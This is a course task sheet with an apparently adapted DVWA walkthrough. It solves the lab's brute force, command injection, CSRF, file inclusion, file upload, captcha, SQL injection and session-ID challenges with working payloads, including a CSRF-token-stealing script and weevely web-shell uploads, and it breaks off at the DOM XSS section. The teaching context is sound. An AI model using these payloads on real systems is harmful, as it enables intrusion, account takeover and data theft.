# DVWA 

## Tasks

- Download and setup [DVWA](https://github.com/digininja/DVWA) on VM of your choice you can also use Docker but VM or Host machine is recommended for ease.

- Follow the walktrough via the [video](https://youtube.com/playlist?list=PLHUKi1UlEgOJLPSFZaFKMoexpM6qhOb4Q&si=eMQYrXYO7smaaXPU) and the bottom text to understand how web applications can be attacked.


## Walktrough 

What is **[DVWA](https://dvwa.co.uk/)**? The DVWA, or in full the **Damn Vulnerable Web App** is an application for testing security vulnerabilities. It is aimed at people who want to practice penetration testing in a **legal way** by using a **legal target**. Getting started with the DVWA is one of the best ways to start learning legal ethical hacking, the application is a perfect fit for varying level users.

Note: this article is extra long. Feel free to focus on the most relevant for you information.

The application is built with PHP and MySQL, a classical duet. What does it mean for someone willing to learn penetration testing? That the application is easy to install on different OS, as both PHP and MySQL work almost everywhere. Also, the fact that it is built with PHP means that it will be easier to understand the code chunks of the DVWA. As the application has many examples for different vulnerabilities (more on this later) that are implemented in PHP. PHP is not the hardest programming language to understand, also there are various resources that would help understand the PHP code.

Moving straight to the point, today we are going to overview the DVWA, will see how to set up DVWA, and finally how to use DVWA, the Damn Vulnerable Application.

Who created DVWA?
-----------------

For some time I was incorrectly sure that the **DVWA project** was created and is maintained by [OWASP](https://owasp.org/). And that wouldn't be a surprise as the OWASP maintains a bunch of very popular vulnerable apps. As there are plenty of people working with various projects, that are developed with different tech stacks, these applications are a perfect choice for learning penetration testing,

Anyway, this time the **OWASP community** is not the one who is credited for creating the **Damn Vulnerable Web Application.** The best person to answer what is DVWA is [Ryan Dewhurst](https://twitter.com/ethicalhack3r) who created it in 2009,  during his university years as an open source project. As Ryan told himself, he developed it to learn about web application security.

![Interview with DVWA Creator Ryan Dewhurst](https://bughacking.com/wp-content/uploads/2021/03/Interview-with-DVWA-Creator-Ryan-Dewhurst.png)

Interview with the Damn Vulnerable Web Application creator Ryan Dewhurst

As Ryan mentioned in the [interview he gave to Security Boulevard](https://securityboulevard.com/2021/01/interview-with-ryan-dewhurst-founder-of-wpscan), he is no longer the main maintainer of the project and his friend Robin Wood, also known as [digininja](https://digi.ninja/), now is taking care of it.

Is it still relevant today?
---------------------------

The real question is this – is the DVWA relevant today? It sure is. The vulnerabilities that are implemented in the DVWA are still in the wild today. In fact, vulnerabilities such as SQL injection are still the same dangerous as it was in 2009, nowadays being [one of the most common attack vectors](https://techmonitor.ai/techonology/cybersecurity/sql-attacks).

Before proceeding to more complex exploitation of vulnerabilities it is crucial to have solid basics. And Damn Vulnerable Web Application provides that.

The last time I checked, the application had more than 5k of stars on Github. Even though it is here since 2009, it is being updated since then, for over 12 years. Last commit was just few days ago.

![DVWA Github repository](https://bughacking.com/wp-content/uploads/2021/03/Github-repo.png)

This just proves that DVWA is as relevant today, as it was 12 years ago.

How to access the application?
------------------------------
Connect to the vpn and access the address http://10.13.1.42:8081/


How to use the Damn Vulnerable Web Application?
-----------------------------------------------

 In order to access the functionality, you have to login. One of the first puzzles you will need to solve is how to find DVWA admin password. Try doing it without checking the answer. You can guess it as this is pretty intuitive, you might also try brute force attack, if you are familiar with the tools needed to do so.

![DVWA Login](https://bughacking.com/wp-content/uploads/2021/03/dvwa-login.png)

Anyway, if you are in a rush and just want to take a look around the application, this is the **DVWA username and password: admin:password.**

As you are already connected to the application, you might see that everything is organized by different vulnerability types. 

![Damn Vulnerable Web Application Vulnerabilities](https://bughacking.com/wp-content/uploads/2021/03/dvwa-vulnerabilities.png)

If we tried to count how many bugs in DVWA there are, we can find plenty of them – there are more than 14 vulnerabilities. What I mean by "more than", is that the project creators state that there are both, documented and undocumented vulnerabilities. The next chapter of this article provides a DVWA walkthrough for the documented vulnerabilities. All the undocumented ones will be left for your exploration. If you are willing to become a penetration tester, you must develop a habit of searching for vulnerabilities that might not be so obvious.

If you took some time getting familiar with application, you might had already noticed that it has four difficulty levels:

*   **Low** – if you have a difficulty level set to low, most of the vulnerabilities will be easy to exploit. There are no security measures implemented.  
*   **Medium** – this difficulty level illustrates how the security measures can be implemented in a bad way.   
*   **High** – this level will be a little bit trickier to exploit and it will provide a level of difficultness similar to the CTF (capture the flag) competitions.  
*   **Impossible** – if you think this is a challenge for you, well.. good luck. This level is secure and is created as an example of how the secure code should look versus insecure.  

Naturally, you should start by low level and increase the difficulty while proceeding with it. 

The purpose of setting the DVWA security level to low is to investigate how the vulnerability could be exploited in the worst case – when there are no security measures at all.

While it's up to you how you want to use the application, it might be a good idea to investigate one vulnerability at the time. If you start with the brute force, investigate all difficulty levels for it. But then again, that's up to you, you can walk through every vulnerability with low difficulty before increasing the level.

DVWA Walkthrough
----------------

Spoiler alert: this section contains solutions to a lot of the DVWA vulnerabilities. It is always a great idea to practice by yourself and to seek help when you are really stuck.

I've noticed that many DVWA walkthroughs are pretty outdated. It has only three levels: **low, medium**, and **high**. And we know that there is a 4th level  – **impossible**. In the past Damn Vulnerable Web Application releases, the **impossible** level was called as **high**.

This is the reason I decided to make a quick review of the DVWA security challenges. Each of the analysed Damn Vulnerable Web Application vulnerabilities will have an explanation how it can be exploited with different difficulty levels set.

This article will not focus on explaining how each of the vulnerabilities exactly works as DVWA has references in each of the pages, so this would be redundant. However, there is a short description for each of the vulnerabilities.

### Brute Force

Brute force attack is an attack that works by trying various combinations of symbols, words, or phrases. Purpose of it is to guess a password, directory, or anything that an attacker wants to find out. Usually big dictionaries are used for the attacks.

**Low**

With the Low level there are no security measures against brute force attacks. We can use Burp Suite to execute this attack. However, it doesn't matter what tool will be used, John The Ripper, Hydra, or Burp Suite, as the principe of attack is pretty straightforward – you identify the request (GET request in this case) that sends login credentials, you use a dictionary with different words, and perform many requests. Then you review the responses and check if a password was identified during the attack.

If you want to use Burp for this purpose, what you should do is to run the Burp Suite, configure the proxy, then intercept the request from the DVWA brute force page.

![Brute Force DVWA Vulnerability](https://bughacking.com/wp-content/uploads/2021/03/low-1-1024x681.png)

After that, use a dictionary and try to brute force the password. In [Kali Linux](https://www.kali.org/), there are dictionaries in different locations, but you might use this one – **/usr/share/dict/wordlist-probable.txt**. As you might see in the picture below, the password was found pretty fast. If you paid attention to the response length, you will see that the request where **password** was used as a password, the response is longer than requests with the incorrect password.

![Password was Found Successfully](https://bughacking.com/wp-content/uploads/2021/03/low-2.png)

**Medium**

While DVWA brute force attack is still possible with Medium difficulty, there is a 2 seconds delay between requests. If you have the correct password in the beginning of your dictionary, you are lucky. But if you use a dictionary with 200k+ passwords and the correct one is somewhere near the end?

**PRO TIP: you can change the difficulty by editing cookie.**

![Medium Level Brute Force DVWA vulnerability](https://bughacking.com/wp-content/uploads/2021/03/medium.png)

**High**

With the High difficulty we get a CSRF token with each of the requests. As every time it is unique combination of characters, we have no chance of guessing it.

![CSRF Token Prevents Brute Force Attack](https://bughacking.com/wp-content/uploads/2021/03/high.png)

And without a valid CSRF token, brute force attack becomes useless, as each of the responses has the same length. Even though [CSRF token complicates brute force attack,](https://portswigger.net/web-security/csrf) it is still possible.

If you want to solve DVWA brute force high level vulnerability, you can do it with a custom script. [Here is an example of it](https://medium.com/@dannybeton/dvwa-brute-force-tutorial-high-security-456e6ed3ae39).

**Impossible**

If you want to see how the DVWA brute force vulnerability is implemented in the impossible level, leave the username and password empty and click **Login**. You will get a message that either, username and password is incorrect, or the account was locked because of too many failed logins. But a natural question would be this – what account was locked if there was no username set? (just joking, but it's still a fair point).

![Account Lockout Function on Imposssible Level](https://bughacking.com/wp-content/uploads/2021/03/impossible-1.png)

Anyway, if you tried using username admin and giving incorrect password for three times, the account will become locked. And even though you used a correct password 4th time, you won't be able to login until the account unlocks after 15 minutes.

![Count of Failed Logins is Saved in the Database](https://bughacking.com/wp-content/uploads/2021/03/impossible-2-1024x51.png)

### Command Injection

Command injection is an attack that focuses on injecting and executing commands on OS. This should not be mistaken as code injection. Attack has potentially devastating effects – if a hacker can execute commands on the operating system, we can control the web application itself.

**Low**

On the Command Injection page, we have an input field that asks for an IP address. After entering the IP, the server will execute the PING command on the given IP. But imagine that we don't input the IP only – we add another command. Keep in mind that exploitation of the vulnerability depends on the OS you use for the server. If you have installed DVWA on Windows machine, the syntax for OS commands differs from the Unix commands. So, you can use 127.0.0.1 && dir in order to list all the directories of the current directory, and for Linux, you will have to use **127.0.0.1 & ls** command.

For the purpose of the example, let's try to inject the **pwd** command. So that we could get the view of directory structure.

![Low Severity DVWA Command Injection](https://bughacking.com/wp-content/uploads/2021/03/low.png)

As you might see from the picture above, command injection was successful – server returned us path to the current directory – **/var/www/html/vulnerabilities/exec**.

While this command was not that devastating, imagine, hacker, that managed to find command injection vulnerability, could completely control your OS. This includes stealing data or deleting every single file.

**Medium**

For the medium difficulty there is a list of a few substitutions hardcoded. However, not every symbol is blacklisted.

![Medium Severity DVWA Command Injection](https://bughacking.com/wp-content/uploads/2021/03/medium-1.png)

If you paid attention, **||** is not blacklisted and can be used.

**High**

To solve this level, open the View Source tab and closely investigate what symbols are blacklisted. If you paid extra attention to the filters, you probably saw, that ‘| ‘ is blacklisted. However, the symbol has space after it. And what if we entered our command without space?

![High Severity DVWA Command Injection](https://bughacking.com/wp-content/uploads/2021/03/high-2.png)

As you might see, this was successful.

**Impossible**

This level shows what is the effect of blacklisting versus whitelisting. With the low, medium, and high DVWA security levels, we've managed to bypass the filter either because there were no (low level), or they were not complex enough. But impossible level implemented whitelisting and allows only specific values, instead of having a blacklist for some of the characters.

### CSRF

CSRF (Cross Site Request Forgery) is an attack that might be used to force user to execute an unwanted action. In short words, if an user opens a malicious page A, that aims to exploit page B, as a result, a request by the name of a user, might be performed to the B website. Quick example – user opens URL sent by attacker, it exploits CSRF vulnerability in a bank website that the user is connected, and money is sent from the bank account to account of a criminal.

**Low**

DVWA CSRF vulnerability is implemented in a simple way – there is a page for changing a password. It only asks for a new password and for its confirmation. Low security level has no CSRF measures set and it can be forged easily. We can create a simple HTML file with an image element. That element will have a source, that we can set as a password changing request. In the image below you can see how the HTML file might look like. Just make sure you **set the** **IP of your Damn Vulnerable Web Application installation instead of the 192.168.1.116**.

![Low Severity DVWA CSRF](https://bughacking.com/wp-content/uploads/2021/03/low-3.png)

After you created the file and saved it in a HTML format, the next step would be to run the HTML in your browser. After it is executed, the password will change for the admin user.

**Medium**

In order to solve this one, you will have to chain vulnerabilities. We can't use the same method we used previously, we have to make the server think this is a genuine request. And this can be made by adding a **Referer header**. If we used Burp Suite, intercepted request, and added **referer** as **one of the headers** before sending, this would work.

![Medium Severity DVWA CSRF](https://bughacking.com/wp-content/uploads/2021/03/medium-2.png)

However, this does not solve the problem. Idea of the CSRF is that the "victim" has to be tricked and request has to be executed by **his** browser. Even though the previous example would be effective, a header should be modified manually in order for this to succeed. Another approach how we can solve this problem, instead of tricking the server this request was sent from the website, we can really send a request from the website. And a way to achieve this is to use [XSS](https://owasp.org/www-community/attacks/xss/).  Go to the **XSS (Reflected)** page and insert this to the input field:

_<img src="http://YOUR\_IP/vulnerabilities/csrf/?password\_new=aba&password\_conf=aba&Change=Change">/img>_

Make sure you changed the YOUR\_IP to the IP yours DVWA installation is accessible by. If you have it locally, **localhost** would work.

![Medium Severity DVWA CSRF - Chaining With XSS](https://bughacking.com/wp-content/uploads/2021/03/medium-2-1.png)

As a result, request will be executed and password will change.

**High**

With the High level, there is an anti-CSRF token added. This means that somewhere on the page there is an HTML element, likely an invisible input field, that consists of the randomly generated token. As the token is long enough, it would take years of brute forcing to get it by force. In our case, we have to provide a CSRF token with every password changing request. Let's say we changed the password, intercepted the request, and wanted to repeat the process. If we've tried sending the same request it would fail as the token changed.

![High Level DVWA CSRF Vulnerability](https://bughacking.com/wp-content/uploads/2021/03/high-1-1.png)

If the request was legit, we would get 200 status code from the server.

On the internet, you might find different solutions for this vulnerability. However, most of them are not valid. The most popular "incorrect" way to exploit this vulnerability, is to create an HTML page, copy the form with a CSRF token, that is used for password changing, After that it should mystically reach the victim. Probably not the best way to exploit DVWA high CSRF vulnerability.

We have to chain vulnerabilities in order to change the password on a high level. The first step would be to get the CSRF token from the page. And for this purpose, we will use a simple script that will be executed by exploiting XSS (DOM) vulnerability. But of course, there are other ways to achieve the same goal, so feel free to experiment.

Code snippet below will be effective in our case. What it does is can be broke down into two parts:

*   First of all, it gets the CSRF token from the page.
*   After that it constructs a GET request to the CSRF vulnerability page (URL is defined in lines 1 and 2) with our new password (defined in line 3) and it adds the CSRF token (line 19) to the final request (line 20).

    var hostname = 'http://10.0.1.42:8081';
    var the_url = hostname + '/vulnerabilities/csrf';
    var pass = 'newpasswd123';
    var regex = /user_token\' value\=\'(.*?)\' \/\>/;
    
    if (window.XMLHttpRequest){
        xmlhttp=new XMLHttpRequest();
    }else{
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    }
    
    xmlhttp.withCredentials = true;
    var activated = false;
    xmlhttp.onreadystatechange=function(){
        if (xmlhttp.readyState == 4 && xmlhttp.status == 200)
        {
            var text = xmlhttp.responseText;
            var match = text.match(regex);
            var token = match[1];
            var new_url = the_url + '/?user_token=' + token + '&password_new=' + pass + '&password_conf=' + pass + '&Change=Change'
            if(!activated){
                alert('Token that was received: ' + match[1]);
    	    activated = true;
                xmlhttp.open("GET", new_url, false );
                xmlhttp.send();
            }
        }
    };
    xmlhttp.open("GET", the_url, false );
    xmlhttp.send(); 

Now we have to host this script somewhere. Even though it can be hosted virtually anywhere on the public internet, for the sake of simplicity, we can upload this to our Damn Vulnerable Web Application server. Keep in mind that you can exploit another DVWA vulnerability – **File Upload** and try to upload the script. If you are seeking more challenges I encourage you to try to do so. For this example, I will **upload the script named dvwa-high.js to the** **/var/www/html folder** of the DVWA installation. One of the prerequisites for this is to give the script sufficient permissions: **sudo chmod 755 dvwa-high.js**.

After creating **dvwa-high.js** file, setting **correct IP** in the first line, upload it to your server and validate that the script is accessible by visiting **http://10.0.1.42:8081/dvwa-high.js**. You should see the contents of JS file on the opened page.

As we must exploit another vulnerability, open the DOM Based XSS page (**/vulnerabilities/xss\_d**). And click on the **Select** button. URL will look like this: **http://10.0.1.42:8081/vulnerabilities/xss\_d/?default=English**. What you need to do is to attach the script:

    ...=English#<script src="https://10.0.1.42/dvwa-high.js"></script>

With this URL crafted, hit Enter and refresh the page. If everything went fine, you should get a popup with the CSRF token:

![Token was Received Successfully](https://bughacking.com/wp-content/uploads/2021/04/high-2-1024x461.png)

And after hitting the OK button, request with new password and CSRF token will be sent. You can make sure about it by inspecting sent requests:

![DVWA High CSRF Vulnerability Exploited Successfully](https://bughacking.com/wp-content/uploads/2021/04/high-3.png)

And the last step would be to check if the password was really changed. For this purpose **/vulnerabilities/csrf/test\_credentials.php** page will help. WIth the username **admin** and new password **newpasswd123**.

![Password was Changed Successfully with the CSRF Token](https://bughacking.com/wp-content/uploads/2021/04/high-4.png)

You should get a success message.

**Impossible**

With the Impossible level there comes another security mechanism that should mitigate CSRF. In order to change the password, the user has to enter his old one, and this is an effective mitigation technique that fixes the vulnerability.

### File Inclusion

File inclusion vulnerability point is to make the web application to execute uploaded code. Let's say we've managed to upload a web shell to the target. By itself it does nothing, however, if we've managed to run it, we would get remote access to the host. There are two types of file inclusions:

*   **Local fle inclusion (LFI) –** in case the file was uploaded to the target and can be accessed from a local server.
*   **Remote file inclusion (RFI) –** in this type of file inclusion, file is included from a remote host.

**Low**

As you might see on the page, there are three files – **file1.php, file2.php**, and **file3.php**. All of them reside on a local server.

![DVWA File Inclusion Page has Links to Three PHP Files](https://bughacking.com/wp-content/uploads/2021/04/file-inclusion-1.png)

Now click on one of them, and pay attention to how the URL looks like. It loads file1.php like this: **?page=file1.php**.

![URL Structure of the File Inclusion Vulnerability](https://bughacking.com/wp-content/uploads/2021/04/file-inclusion-2.png)

And this is how the file inclusion itself looks like. Keep in mind that this is a legit file, however, if a harmful file was somehow uploaded (by exploiting another vulnerability), it can be run easily.

In the file inclusion DVWA vulnerability example there is a specific task – you have to access a specific PHP file. If you would try to access it manually, by visiting a page, you would get an error: **Nice try ;-). Use the file include next time!** But as there is another way to load a page, this problem can be solved easily – by constructing URL in this style: **?page=../../hackable/flags/fi.php.**

As a result, you will get the secret quotes that previously were not visible.

![Fi.php File Was Accessed Successfully](https://bughacking.com/wp-content/uploads/2021/04/file-inclusion-3.png)

However, there is more that can be exploited in this situation. You can easily get the passwd file with the local file inclusion: **?page=../../../../../../etc/passwd**.

But we covered only local, but not remote file inclusion. In case of a RFI, you can load an external script or page:

![Low Security DVWA Remote File Inclusion Example](https://bughacking.com/wp-content/uploads/2021/04/file-inclusion-4-1024x543.png)

Included page will load on top of the DVWA page, and you will get RickRoll'D.

**Medium**

With Medium security level a few security measures were added. However, they do not solve the file inclusion vulnerability, just adds some obscurity. You can try this yourself. Firstly, repeat steps of exploitation explained in the previous sections. It does not work, and this is because there is a blacklist with character sequences that are forbidden. You can find them by clicking on View Source section of the page:

*   http://
*   https://
*   ../
*   ..\\

Too bad but it can be bypassed easily. What happens if instead of **https://** we will use **hTTps://**? BINGO.

![Bypassing Filters on Medium DVWA File Inclusion Vulnerability](https://bughacking.com/wp-content/uploads/2021/04/file-inclusion-5-1024x515.png)

By knowing what filters are used for LFI validation, we can see that it can be bypassed by adding extra dots and slashes:

![Bypassing Filters for Medium DVWA Local File Inclusion Vulnerability](https://bughacking.com/wp-content/uploads/2021/04/file-inclusion-6.png)

**High**

This can be exploited by exploiting high-level File Upload vulnerability, which is covered in the following subsection. For now, what you should pay attention to, after observing the source code of the high file inclusion page, is that only files starting with the name **"file"** are whitelisted.

    if( !fnmatch( "file*", $file ) && $file != "include.php" )

After exploiting the **File Upload vulnerability,** which is explained in the next section, we can include any file we've managed to put into the server.. All we need to do is to append the location to the included file that starts with "file". Like this: **page=file1.php%0A/../../../hackable/uploads/dvwa\_email.png**

As a result, we can see that the picture was opened (although not in the human understandable graphical format).

![High DVWA File Inclusion was Successful](https://bughacking.com/wp-content/uploads/2021/04/high-file-inclusion-1-1024x196.png)

**Impossible**

Impossible level has a specific whitelisted requirements that can't be bypassed in an obvious way. Specific pages and specific filenames are allowed. Anything that is not in the whitelist can't be included.

### File Upload

File upload vulnerability is one of the most dangerous ones. The reason for this is that uploaded files might be exploited in many ways: by making the server run a malicious script, or executing the script in the user's browser. This can all potentially lead to hazardous compromise of a server and even the user.

**Low**

Right now, with the Low severity set, DVWA accepts any file. And this can be used to our advantage. Let's try exploiting it. This will consist of a few steps:

*   Generating an agent.
*   Uploading the generated agent to DVWA.
*   Accessing the uploaded file in order for it to execute.
*   Connecting to the server with a web shell.

By default, Kali Linux comes with a reverse shell called weevely. The first step would be to generate an agent, and this can be done from the command line: **weevely generate your-password legitfile.php.**

![Weevely Shell Generated for the DVWA File Upload Vulnerability](https://bughacking.com/wp-content/uploads/2021/04/file-upload-1.png)

Now upload it to the DVWA file upload page.

![Shell Was Uploaded Successfully](https://bughacking.com/wp-content/uploads/2021/04/file-upload-2.png)

Try accessing the file. You should see a blank page. Now try to establish session with the DVWA: **weevely http://YOUR-DVWA-IP/hackable/uploads/legitfile.php your-password**.

![Connection was Established with the Low DVWA File Upload Vulnerability Functionality](https://bughacking.com/wp-content/uploads/2021/04/file-upload-3.png)

If everything worked out, you should get access. In my case, a connection with a **www-data** user of DVWA instance, which is located on Raspberry Pi, was gained. From this point, external actors might do a lot of harm.

**Medium**

For the medium DVWA file upload level, there are two filters added: for the file name and file size. Size would not be a problem as we are not trying to upload movies, but the type will make the task for us trickier. However, by inspecting the code from the vulnerability page, we can see that the allowed type is **image/jpeg**. What we should do next is to make the upload look like a legit image upload.

For this purpose start Burp Suite with a proxy and try to upload the same file we used for the low security level. But before forwarding it make sure you stopped it in Burp Suite.

![Medium DVWA File Upload Request Interception](https://bughacking.com/wp-content/uploads/2021/04/medium-level-file-upload-1.png)

We can see that there is a **Content-Type** header that has a value **application/x-php**. This will definitely be rejected as it differs from the whitelisted **image/jpeg** and **image/png** types. But as we have the request intercepted, we can edit this value (**Content-Type: image/jpeg**) and forward the request with our PHP script.

![File Upload DVWA on Medium Security Level: Script was Uploaded Successfully](https://bughacking.com/wp-content/uploads/2021/04/medium-level-file-upload-2.png)

Great success! Now we can establish a connection like we done with the low level set.

**High**

This time server will try to resize the uploaded "image". And as our "image" might not look like .. an image, we might have a problem. Hint on the application says that file inclusion vulnerability has to also be exploited in order for the high file upload vulnerability to be exploited successfully.

If you have PHP 5.X on your server, this might vulnerability would be easier to exploit with the [null byte injection](https://resources.infosecinstitute.com/topic/null-byte-injection-php/). However, if you have PHP 7.x or newer version, a **null byte** won't work.

Moving on with the exploitation, we have to change the file type and file extension. This is needed for bypassing the filters.

**mv legitfile.php filelegit.jpeg**

The command will change **php** extension to **jpeg**. Additionally, it will change the name. As the **legitfile.php** filename was already used for the medium security level, this will help to distinguish what file we are working with.

Another step we should make is changing the file type. This can be done by opening our file (just a few moments ago renamed to **filelegit.jpeg**) and adding a leading line with **GIF89a;**. And now, our PHP code officially becomes GIF.

![Changing File Type to GID](https://bughacking.com/wp-content/uploads/2021/04/high-file-upload.png)

Now back to the point, try to upload the file. This should be effective:

![Modified File was Uploaded Successfully](https://bughacking.com/wp-content/uploads/2021/04/high-file-upload-2.png)

The way how we can run our code distinguished as a jpeg, is by chaining this vulnerability with **[high level File Insclusion](/dvwa-ultimate-guide-first-steps-and-walkthrough/#File_Inclusion)**. In the File Inclusion page, construct a URL that will open the file:

**http://YOUR\_IP/vulnerabilities/fi/?page=file1.php%0A/../../../hackable/uploads/filelegit.jpeg**

How does it work is explained in the previous subsection.

![Chaining File Upload Vulnerability with File Inclusion](https://bughacking.com/wp-content/uploads/2021/04/high-file-upload-3.png)

As you might see, the result is that the code was executed and the reverse shell is possible. You can see it from the **GIF89a;** part that was printed.

**Impossible**

This level has many security measure that will make an upload of a non-image almost impossible.

### Insecure CAPTCHA

Captcha is a security mechanism against automated bots (robots). In order to prevent automatic actions, users should solve a simple task. This task can be solved only by a human and usually it is a great countermeasure against robots.

**Low**

Even though a **captcha** is set for the low level, and you must confirm it before proceeding, it is not implemented properly. After submitting the **captcha** with a new **password, with a Burp proxy,** you can see that there are two requests that are mainly responsible for submiting the new password and captcha response. This is how the first one looks like:

![Low DVWA Captcha with Recaptcha Response](https://bughacking.com/wp-content/uploads/2021/04/low-step-1.png)

However, the second request to the **/vulnerabilities/captcha/** page has no **g-recaptcha-response** in the POST body:

![DVWA Low Captcha without Recaptcha Response can be used for Changing Password](https://bughacking.com/wp-content/uploads/2021/04/low-step-2.png)

And in conclusion, we can repeat the second request that requires no reCaptcha response. This will bypass the captcha implementation and will change the password.

![DVWA Low Captcha - Password Changed Successfuly](https://bughacking.com/wp-content/uploads/2021/04/low-captcha-password-changed.png)

**Medium**

With the lowest security level, password **reCaptcha** can be bypassed very easily. However, the medium DVWA reCaptcha level has a special parameter that states the number of step of the password changing process. But this is still not effective and can be manipulated pretty easily.

![Manipulating Step and Passed_captcha Parameters will Lead to Medium DVWA Captcha Bypass](https://bughacking.com/wp-content/uploads/2021/04/dvwa-medium-captcha-vulnerability.png)

All we need to do is to send the request that has **step=2** and **passed\_captcha=true** parameters.

**High**

**High DVWA captcha** level has security measures implemented that will complicate the bypassing of captcha. But the good thing is there is a way how we can still solve this. By inspecting page HTML code, you can find secret values (Response: ‘hidd3n\_valu3' && User-Agent: ‘reCAPTCHA') that were left during the development. These are values that were "accidentally" left as a comment by a developer. A pretty possible situation in the wild. By using these values, we will be able to bypass the reCaptcha validation for our request.

![Development Values will Help to Bypass the Captcha](https://bughacking.com/wp-content/uploads/2021/04/captcha-DVWA-high-level.png)

And the Burp response will contain a page with the wanted **Password Changed** words.

**Impossible**

This level has some effective mitigation techniques added. First thing that comes to the sight, that you must enter current password before providing new one. Also, there is only one request made that must contain valid captcha response.

### SQL Injection

SQL injection is probably one of the most disastrous injection types. As this vulnerability is able to affect the most important part of the system – data, sequences can be devastating. This can vary from altered data to the full data loss after it was deleted by a malicious actor.

**Low**

As the task for the DVWA SQL Injection vulnerability is to get the passwords of the users, this query will return the passwords of existing users.

````sql
1' UNION SELECT user, password FROM users#
````

PRO TIP: if you get an error with this query, write the symbol ‘ by hand on the SQL Injection DVWA page.

As the input field requires user ID, we give it to the server, but additionally, we append our own command (that is constructed accordingly to the database type and version). Command reaches databases and returns us the users list. Returned passwords are hashed. They can be de-hashed by using Kali Linux [tools](https://tools.kali.org/password-attacks/findmyhash).

![DVWA SQL Injection on Low Securtiy Level](https://bughacking.com/wp-content/uploads/2021/04/dvwa-sqli-low-level.png)

**Medium**

This security level has a mitigation technique implemented – it uses [mysql\_real\_escape\_string()](https://secure.php.net/manual/en/function.mysql-real-escape-string.php). While this does not allow the quotes in the passed value, in our case we do not need them. Previosly used payload is effective without the single quote:

````sql
1 UNION SELECT user, password FROM users#
````

We can modify one of the ``<select>`` element elements by setting value to our payload:

![Setting Option Value to Our Payload](https://bughacking.com/wp-content/uploads/2021/04/dvwa-sqli-medium-level.png)  

As a result, we can submit the option 1 and get the passwords:

![SQL Injection was Executed for Medium Level](https://bughacking.com/wp-content/uploads/2021/04/dvwa-sqli-medium-submitted-payload.png)

**High**

The **High** severity SQL injection DVWA example requires entering user ID on another page. This does not change the fact that vulnerability exists. We can use the same payload we used for the **Low** security level (and for the medium after a small tweaking).

![High DVWA SQL Injection Vulnerability Exploitation in Action](https://bughacking.com/wp-content/uploads/2021/04/dvwa-sqli-high-level.png)

**Impossible**

As the impossible level has parameterized queries implemented, previous payload will not be effective as there is a no way we can escape from the query boundaries and append another one.

### SQL Injection (Blind)

It might be trickier to check if an input field leads to the **blind SQL injection**. It does differ from the classical SQL injection by the fact that it does not show directly the results of injection.

By executing the query and checking if there are any errors on the page is one of the ways to test for blind SQLi.

Another way, that will be used in our **DVWA blind SQL injection example, is trying to inject sleep operation into** the database. By comparing normal behavior to the application behavior after **sleep() injection**, we might tell if the blind SQL exists in the Damn Vulnerable Web Application.

**Low**

Just like the classic SQL injection, that we've covered in the previous section, a blind one requires a user ID. What can we do in order to test if the **DVWA blind SQL injection** exists, is to add the mentioned sleep function: **1′ AND sleep(5)#**.

![Low Security Level Blind SQL Injection on DVWA](https://bughacking.com/wp-content/uploads/2021/04/low-security-level-blind-sqli-on-dvwa.png)

You might have noticed that this request took a while to execute. We can use [Burp Suite intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder/using) to make it even more obvious. Let's submit and intercept the request with the sleep function. Then we can send it to the intruder, add a list of payloads that consists of **numbers 1-10**, add the position for inserting value to **sleep() function**, and run it.

![Response Time Increases for Each of The Send Requests](https://bughacking.com/wp-content/uploads/2021/04/dvwa-blind-sqli-sleep-time-increases.png)

We can observe that the response time increases each time we use a higher number payload.

**Medium**

Just like with the previously explained DVWA SQL Injection vulnerability, the same is with the blind SQLi – one of the ``<select>`` element options can be edited with a value that consists of a **blind SQLi payload** – **1 AND sleep(5)#**.

![Payload can be Added to the Option Element Value](https://bughacking.com/wp-content/uploads/2021/04/medium-level-blind-sqli-explained-1.png)

Even though this time this is a POST request instead of GET, we can see that injection was effective as response times are growing when increasing the payload number.

![Response Time's Growth with Medium Level Blind SQL Injection ](https://bughacking.com/wp-content/uploads/2021/04/medium-dvwa-blind-sql-injection-with-sleep.png)

**High**

With the high level, this becomes a little bit trickier, as the entered value is transferred into a cookie and then the request is made.

![](https://bughacking.com/wp-content/uploads/2021/04/high-blind-sql-injection-vulnerability.png)

But as we are able to intercept the request, we are able to modify it. One thing to consider for **high blind SQL injection** is that there is a random amount of sleep added. If we've used small values for a sleep function, we might not validate the blind SQLi.:

````js
    // Might sleep a random amount
    if( rand( 0, 5 ) == 3 ) 
    	{sleep( rand( 2, 4 ) )
    ;} 
````

This time we have to use higher values if we want to validate existence of the vulnerability.

![Increased Sleep Times for the High Blind SQL Injection vulnerability](https://bughacking.com/wp-content/uploads/2021/04/high-blind-sql-injection-vulnerability-2.png)

**Impossible**

Parameterized queries are used which makes exploitation of the blind SQli impossible.

### Weak Session IDs

Another vulnerability of the DVWA is **Weak Session IDS**. If the IDs generation is weak enough, a malicious actor does not even need complex vulnerability chaining in order to gain access to the system. In case the ID creation is based on a guessable pattern, the only thing one should do is reverse engineer it.

**Low**

By viewing the **browser's developer tools' Storage tab**, we can see that first time the session ID is equal to 1 – **dvwaSession** value is set to 1.

![Low DVWA Weak Session IDs First Value is Equal to One](https://bughacking.com/wp-content/uploads/2021/04/low-dvwa-weak-session-ids.png)

After clicking on **Generate** button for second time, we can see that the ID gets the value 2. From this we can state that the ID generation is incremental and it is easy to guess what session ID will be generated the next time.

![Weak Session IDs of DVWA Low Level: ID is Incremental](https://bughacking.com/wp-content/uploads/2021/04/weak-session-ids-incremental-generation.png)

**Medium**

This time we can see that the value of **dvwaSession** differs each time. Even though it is higher each time, we cannot state by what number it does increment.

![DVWASession Value is Equal to Current Data in the Medium Level](https://bughacking.com/wp-content/uploads/2021/04/dvwa-session-value.png)

But if we translated this value from [Epoch to human date](https://www.epochconverter.com/), we will realize that this is the current date as a session ID value.

**High**

With the high level, we can see that the value looks complex enough and there is no visual similarity between current and new value. Although, if we've guessed that this value looks like an [MD5 hash](https://en.wikipedia.org/wiki/MD5), and tried to reverse engineer it, we would realize **this is a hash of number 1**.

![High DVWA Weak Session IDs: ID is a MD5 Hash of a Number](https://bughacking.com/wp-content/uploads/2021/04/high-dvwa-session-id-vulnerability.png)

**Impossible**

For the secure, impossible, level session ID generation has no template as a hash of a random value plus word "Impossible" is calculated.

### XSS (DOM)

Cross-Site Scripting (XSS) is another injection attack. With this attack, malicious scripts are injected into the website and executed as legitimate ones. There are a few types of XSS, one of them is DOM-based XSS. This works differently than reflected or stored XSS, as DOM-based XSS happens because of the modification of a DOM environment by the client-side script.

**Low**

